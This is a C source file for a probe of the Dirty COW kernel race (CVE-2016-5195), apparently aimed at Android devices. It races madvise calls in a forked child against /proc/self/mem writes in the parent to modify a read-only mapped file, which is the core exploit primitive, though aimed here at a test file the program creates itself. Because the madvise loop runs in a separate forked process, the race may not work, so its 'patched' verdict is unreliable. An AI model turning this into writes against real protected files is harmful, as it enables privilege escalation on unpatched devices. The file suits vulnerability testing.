/*
 * dirtycow_probe2.c — Simplified Dirty COW probe using fork() to avoid pthread_join hang
 * Uses child process for madvise loop, parent does writes, kill child on timeout.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <signal.h>
#include <time.h>

#define TESTFILE "/data/local/tmp/dirtycow_test2.txt"
#define FILESIZE 4096

int main(void) {
    printf("=== Dirty COW probe v2 (CVE-2016-5195) ===\n");
    printf("[*] uid=%d pid=%d\n", getuid(), getpid());
    fflush(stdout);

    /* Create test file with 'A's */
    int fd = open(TESTFILE, O_RDWR | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) { perror("open testfile"); return 1; }
    char fillbuf[FILESIZE];
    memset(fillbuf, 'A', FILESIZE);
    if (write(fd, fillbuf, FILESIZE) != FILESIZE) { perror("write fillbuf"); return 1; }
    close(fd);
    sync();

    /* Map read-only private */
    fd = open(TESTFILE, O_RDONLY);
    if (fd < 0) { perror("open rdonly"); return 1; }
    char *map = mmap(NULL, FILESIZE, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) { perror("mmap"); close(fd); return 1; }
    close(fd);

    printf("[*] Map at %p, map[0]='%c'\n", (void*)map, map[0]);
    fflush(stdout);

    /* Open /proc/self/mem for writing */
    int memfd = open("/proc/self/mem", O_RDWR);
    if (memfd < 0) { perror("open /proc/self/mem"); return 1; }

    /* Test: can we even write to this mapping via /proc/self/mem? */
    char testbuf[4];
    memset(testbuf, 'T', 4);
    lseek(memfd, (off_t)map, SEEK_SET);
    int wr = write(memfd, testbuf, 4);
    printf("[*] Test write to map via /proc/self/mem: wr=%d errno=%d\n", wr, errno);
    printf("[*] map[0] after test write = '%c'\n", map[0]);
    fflush(stdout);

    /* Fork madvise child */
    pid_t child = fork();
    if (child == 0) {
        /* Child: tight madvise loop */
        while (1) {
            madvise(map, FILESIZE, MADV_DONTNEED);
        }
        _exit(0);
    }
    printf("[*] madvise child pid=%d started\n", child);
    fflush(stdout);

    /* Parent: tight write loop for 3 seconds */
    char writebuf[8];
    memset(writebuf, 'X', 8);
    struct timespec start, now;
    clock_gettime(CLOCK_MONOTONIC, &start);

    long iters = 0;
    while (1) {
        clock_gettime(CLOCK_MONOTONIC, &now);
        long ms = (now.tv_sec - start.tv_sec)*1000 + (now.tv_nsec - start.tv_nsec)/1000000;
        if (ms >= 3000) break;

        lseek(memfd, (off_t)map, SEEK_SET);
        write(memfd, writebuf, 8);
        iters++;
    }
    close(memfd);

    /* Kill madvise child */
    kill(child, SIGKILL);
    waitpid(child, NULL, 0);
    printf("[*] Race complete: %ld iters in ~3s\n", iters);

    munmap(map, FILESIZE);
    fflush(stdout);

    /* Read original file */
    fd = open(TESTFILE, O_RDONLY);
    char result[16] = {0};
    if (read(fd, result, 8) < 0) { perror("read result"); }
    close(fd);

    printf("[*] Original file bytes: ");
    for (int i = 0; i < 8; i++) printf("0x%02x('%c') ", (unsigned char)result[i], result[i] >= 32 ? result[i] : '.');
    printf("\n");

    if (result[0] == 'X') {
        printf("[!!!] DIRTY COW CONFIRMED — original file modified! CVE-2016-5195 PRESENT.\n");
        unlink(TESTFILE);
        return 0;
    } else {
        printf("[-] Original file UNCHANGED. Dirty COW appears PATCHED on this device.\n");
        unlink(TESTFILE);
        return 1;
    }
}
